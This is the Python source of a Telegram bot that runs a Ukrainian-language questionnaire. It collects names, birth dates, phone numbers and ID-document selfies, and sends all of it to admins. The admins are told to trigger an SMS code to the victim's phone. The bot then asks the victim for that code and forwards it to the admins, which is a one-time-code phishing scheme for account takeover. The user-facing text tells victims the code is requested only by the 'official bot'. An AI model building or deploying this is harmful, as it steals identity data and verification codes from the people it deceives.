from aiogram import Router, types, F, Bot
from aiogram.fsm.context import FSMContext
from states.form_states import Form
from keyboard.inline import next_keyboard, confirm_keyboard, support_keyboard
from database.db import save_user_data, get_user_data, save_sms_code, get_all_admins, get_form_by_id, verify_code
from config import SUPPORT_USERNAME
import re
from datetime import datetime

router = Router()

# --- Функции валидации ---

def validate_full_name(text: str) -> bool:
    """Проверка ФИО: минимум 2 слова, только буквы, пробелы и дефисы"""
    if not text or len(text.strip()) < 5:
        return False
    
    # Украинские, русские и латинские буквы, пробелы, дефисы
    pattern = r'^[А-ЯЁІЇЄҐа-яёіїєґA-Za-z\s\-]+$'
    if not re.match(pattern, text.strip()):
        return False
    
    # Минимум 2 слова
    words = text.strip().split()
    if len(words) < 2:
        return False
    
    return True

def validate_date(text: str) -> bool:
    """Проверка даты рождения в формате ДД.ММ.ГГГГ"""
    pattern = r'^\d{2}\.\d{2}\.\d{4}$'
    if not re.match(pattern, text.strip()):
        return False
    
    try:
        day, month, year = map(int, text.strip().split('.'))
        date = datetime(year, month, day)
        
        # Проверка возраста (от 18 до 100 лет)
        today = datetime.now()
        age = today.year - date.year - ((today.month, today.day) < (date.month, date.day))
        
        if age < 18 or age > 100:
            return False
        
        # Дата не может быть в будущем
        if date > today:
            return False
            
        return True
    except ValueError:
        return False

def validate_city(text: str) -> bool:
    """Проверка названия города"""
    if not text or len(text.strip()) < 2:
        return False
    
    # Украинские, русские и латинские буквы, пробелы, дефисы, апострофы
    pattern = r'^[А-ЯЁІЇЄҐа-яёіїєґA-Za-z\s\-\']+$'
    return bool(re.match(pattern, text.strip()))

def validate_phone(text: str) -> bool:
    """Проверка номера телефона (украинские форматы)"""
    # Убираем пробелы, скобки, дефисы
    phone = re.sub(r'[\s\-\(\)]', '', text.strip())
    
    # Украинские форматы: +380XXXXXXXXX, 380XXXXXXXXX, 0XXXXXXXXX
    patterns = [
        r'^\+380\d{9}$',  # +380501234567
        r'^380\d{9}$',     # 380501234567
        r'^0\d{9}$'        # 0501234567
    ]
    
    return any(re.match(pattern, phone) for pattern in patterns)

def validate_area(text: str) -> bool:
    """Проверка площади жилья"""
    if not text:
        return False
    
    # Извлекаем число из строки (может быть с м², кв.м, и т.д.)
    numbers = re.findall(r'\d+(?:[.,]\d+)?', text.strip())
    
    if not numbers:
        return False
    
    try:
        area = float(numbers[0].replace(',', '.'))
        # Площадь от 10 до 1000 м²
        return 10 <= area <= 1000
    except ValueError:
        return False

# --- Этап 1. Нажата кнопка "Продолжить" после /start
@router.callback_query(F.data == "continue_form")
async def send_form_intro(callback: types.CallbackQuery):
    await callback.message.edit_caption(
        caption="Для початку заповніть невелику анкету про себе.",
        reply_markup=next_keyboard()
    )

# --- Этап 2. Начало анкеты
@router.callback_query(F.data == "next_question")
async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.full_name)
    await callback.message.answer(
        "<b>Вкажіть ПІБ:</b>\n"
        "Зразок: Борисенко Сергій Валерійович\n\n"
        "⚠️ ПІБ має містити мінімум ім'я та прізвище"
    )

# --- Этап 3. Вопросы анкеты с валидацией ---
@router.message(Form.full_name)
async def process_full_name(message: types.Message, state: FSMContext):
    if not validate_full_name(message.text):
        await message.answer(
            "❌ <b>Неправильний формат ПІБ!</b>\n\n"
            "ПІБ має містити:\n"
            "• Мінімум 2 слова (ім'я та прізвище)\n"
            "• Тільки букви, пробіли та дефіси\n"
            "• Мінімум 5 символів\n\n"
            "Приклад: Борисенко Сергій Валерійович\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    await state.update_data(full_name=message.text.strip())
    await state.set_state(Form.age)
    await message.answer(
        "<b>Вкажіть дату народження (ДД.ММ.РРРР):</b>\n"
        "Зразок: 10.05.1990\n\n"
        "⚠️ Вам має бути від 18 років"
    )

@router.message(Form.age)
async def process_age(message: types.Message, state: FSMContext):
    if not validate_date(message.text):
        await message.answer(
            "❌ <b>Неправильний формат дати!</b>\n\n"
            "Дата має бути:\n"
            "• У форматі ДД.ММ.РРРР (наприклад: 10.05.1990)\n"
            "• Вік від 18 до 100 років\n"
            "• Реальна дата (не в майбутньому)\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    await state.update_data(age=message.text.strip())
    await state.set_state(Form.city)
    await message.answer(
        "<b>Вкажіть місто проживання:</b>\n"
        "Зразок: Київ\n\n"
        "⚠️ Тільки назва міста"
    )

@router.message(Form.city)
async def process_city(message: types.Message, state: FSMContext):
    if not validate_city(message.text):
        await message.answer(
            "❌ <b>Неправильна назва міста!</b>\n\n"
            "Назва міста має містити:\n"
            "• Тільки букви\n"
            "• Мінімум 2 символи\n\n"
            "Приклад: Київ, Львів, Дніпро\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    await state.update_data(city=message.text.strip())
    await state.set_state(Form.phone)
    await message.answer(
        "<b>Вкажіть мобільний номер телефону:</b>\n"
        "Зразок: +380501234567\n\n"
        "⚠️ Тільки українські номери"
    )

@router.message(Form.phone)
async def process_phone(message: types.Message, state: FSMContext):
    if not validate_phone(message.text):
        await message.answer(
            "❌ <b>Неправильний формат телефону!</b>\n\n"
            "Номер має бути:\n"
            "• Українським (+380...)\n"
            "• У форматі: +380501234567\n"
            "• Або: 0501234567\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    # Нормализуем номер к формату +380...
    phone = re.sub(r'[\s\-\(\)]', '', message.text.strip())
    if phone.startswith('0'):
        phone = '+38' + phone
    elif phone.startswith('380'):
        phone = '+' + phone
    
    await state.update_data(phone=phone)
    await state.set_state(Form.email)
    await message.answer(
        "<b>Вкажіть приблизну площу вашого житла (приміщення):</b>\n"
        "Зразок: 45 м²\n\n"
        "⚠️ Вкажіть число від 10 до 1000 м²"
    )

@router.message(Form.email)
async def process_email(message: types.Message, state: FSMContext):
    if not validate_area(message.text):
        await message.answer(
            "❌ <b>Неправильний формат площі!</b>\n\n"
            "Площа має бути:\n"
            "• Числом від 10 до 1000 м²\n"
            "• Можна вказати: 45, 45.5, 45 м², 45 кв.м\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    await state.update_data(email=message.text.strip())
    await state.set_state(Form.document_photo)
    await message.answer(
        "Для підтвердження особи, необхідно надати селфі зі своїм документом:\n\n"
        "Підійде будь-який з таких документів:\n"
        "1. Паспорт громадянина України (ID-картка або книжка);\n"
        "2. Закордонний паспорт;\n"
        "3. Водійські права;\n"
        "4. Посвідчення особи військовослужбовця.\n\n"
        "⚠️ <b>Вимоги до фото:</b>\n"
        "• Ваше обличчя має бути чітко видно\n"
        "• Документ має бути розбірливий\n"
        "• Фото має бути якісним і не розмитим"
    )

# --- Этап 4. Получение фото и отправка администраторам ---
@router.message(Form.document_photo, F.photo)
async def process_document_photo(message: types.Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    data["document_photo"] = photo_id
    
    # Сохраняем данные в БД
    form_id = save_user_data(user_id, username, data)
    
    # СРАЗУ отправляем анкету всем администраторам
    admins = get_all_admins()
    
    form_text = (
        f"📋 <b>Новая анкета!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Username: @{username}\n\n"
        f"<b>Данные анкеты:</b>\n"
        f"ФИО: {data['full_name']}\n"
        f"Дата рождения: {data['age']}\n"
        f"Город: {data['city']}\n"
        f"📞 <b>Телефон: {data['phone']}</b>\n"
        f"Площадь жилья: {data['email']}\n\n"
        f"⚠️ <b>Отправьте SMS-код на указанный номер телефона!</b>"
    )
    
    for admin_id, admin_username in admins:
        try:
            await bot.send_photo(
                chat_id=admin_id,
                photo=photo_id,
                caption=form_text
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
    
    # Устанавливаем состояние ожидания кода
    await state.set_state(Form.waiting_code)
    await state.update_data(form_id=form_id)

    await message.answer(
        "✅ <b>Дякуємо за заповнену анкету!</b>\n\n"
        "Протягом 24 годин на ваш мобільний телефон надійде SMS-повідомлення з кодом підтвердження анкети.\n"
        "\n"
        "📋 <b>Що робити далі:</b>\n"
        "1. Отримайте код з SMS\n"
        "2. Поверніться в цей чат-бот\n"
        "3. Введіть отриманий код у відповідь на це повідомлення\n"
        "\n"
        "⚠️ <b>Увага!</b>\n"
        "• Не надсилайте код нікому в приватних повідомленнях\n"
        "• Ми запитуватимемо його лише в офіційному боті\n"
        "• Якщо SMS не надійшло, перевірте правильність номера телефону\n",
        reply_markup=support_keyboard(SUPPORT_USERNAME)
    )
    
    # Очищаем состояние после отправки анкеты администраторам
    await state.clear()

@router.message(Form.document_photo)
async def document_photo_invalid(message: types.Message):
    """Обработка неправильного типа сообщения вместо фото"""
    await message.answer(
        "❌ <b>Необхідно надіслати фото!</b>\n\n"
        "Будь ласка, надішліть селфі з вашим документом.\n\n"
        "⚠️ Це має бути саме фото (не файл, не посилання)"
    )

# --- Этап 5. Ожидание кода от пользователя (БЕЗ состояния FSM) ---
@router.message(F.text)
async def process_user_code(message: types.Message, bot: Bot):
    user_id = message.from_user.id
    code = message.text.strip()
    
    # Проверяем, есть ли у пользователя анкета
    user_data = get_user_data(user_id)
    
    # Если анкеты нет или код уже подтвержден, игнорируем
    if not user_data or user_data.get('code_verified') == 1:
        return
    
    # Базовая валидация кода (например, 4-8 цифр или букв)
    if not re.match(r'^[A-Za-z0-9]{4,8}$', code):
        await message.answer(
            "❌ <b>Неправильний формат коду!</b>\n\n"
            "Код має містити:\n"
            "• Від 4 до 8 символів\n"
            "• Тільки цифри або букви\n\n"
            "Спробуйте ще раз:"
        )
        return
    
    # Сохраняем введенный код
    save_sms_code(user_id, code)
    
    # Отправляем уведомление всем администраторам с кнопками проверки
    admins = get_all_admins()
    
    form_text = (
        f"🔐 <b>Пользователь ввёл код!</b>\n\n"
        f"👤 User ID: <code>{user_data['user_id']}</code>\n"
        f"📱 Username: @{user_data['username']}\n\n"
        f"<b>Данные анкеты:</b>\n"
        f"ФИО: {user_data['full_name']}\n"
        f"Дата рождения: {user_data['age']}\n"
        f"Город: {user_data['city']}\n"
        f"Телефон: {user_data['phone']}\n"
        f"Площадь жилья: {user_data['email']}\n\n"
        f"🔐 <b>Введённый код:</b> <code>{code}</code>"
    )
    
    # Создаем клавиатуру для проверки кода
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Код правильный", callback_data=f"verify_yes_{user_data['form_id']}"),
            InlineKeyboardButton(text="❌ Код неправильный", callback_data=f"verify_no_{user_data['form_id']}")
        ]
    ])
    
    for admin_id, admin_username in admins:
        try:
            # Отправляем фото с данными и кнопками
            await bot.send_photo(
                chat_id=admin_id,
                photo=user_data['document_photo'],
                caption=form_text,
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
    
    await message.answer("⏳ Ваш код отримано. Очікуйте перевірки адміністратором.")

# --- Обработка ответов администратора ---
@router.callback_query(F.data.startswith("verify_yes_"))
async def verify_code_yes(callback: types.CallbackQuery, bot: Bot):
    form_id = int(callback.data.split("_")[-1])
    
    # Обновляем статус в БД
    verify_code(form_id, True)
    
    # Получаем данные анкеты
    form_data = get_form_by_id(form_id)
    
    if form_data:
        # Уведомляем пользователя
        try:
            await bot.send_message(
                chat_id=form_data['user_id'],
                text="✅ <b>Ваш код підтверджено!</b>\n\n"
                     "Анкета успішно прийнята. Очікуйте на подальші інструкції від нашої команди."
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
    
    await callback.answer("✅ Код подтверждён")
    await callback.message.edit_caption(
        caption=callback.message.caption + "\n\n✅ <b>КОД ПОДТВЕРЖДЁН</b>",
        reply_markup=None
    )

@router.callback_query(F.data.startswith("verify_no_"))
async def verify_code_no(callback: types.CallbackQuery, bot: Bot):
    form_id = int(callback.data.split("_")[-1])
    
    # Обновляем статус в БД (0 = отклонено, ожидание повторного ввода)
    verify_code(form_id, False)
    
    # Получаем данные анкеты
    form_data = get_form_by_id(form_id)
    
    if form_data:
        # Уведомляем пользователя
        try:
            await bot.send_message(
                chat_id=form_data['user_id'],
                text="❌ <b>Код введено неправильно.</b>\n\n"
                     "Будь ласка, перевірте SMS-повідомлення та введіть код ще раз.\n\n"
                     "Якщо у вас виникли труднощі, натисніть кнопку нижче для зв'язку з підтримкою:",
                reply_markup=support_keyboard(SUPPORT_USERNAME)
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
    
    await callback.answer("❌ Код отклонён")
    await callback.message.edit_caption(
        caption=callback.message.caption + "\n\n❌ <b>КОД ОТКЛОНЁН</b>",
        reply_markup=None
    )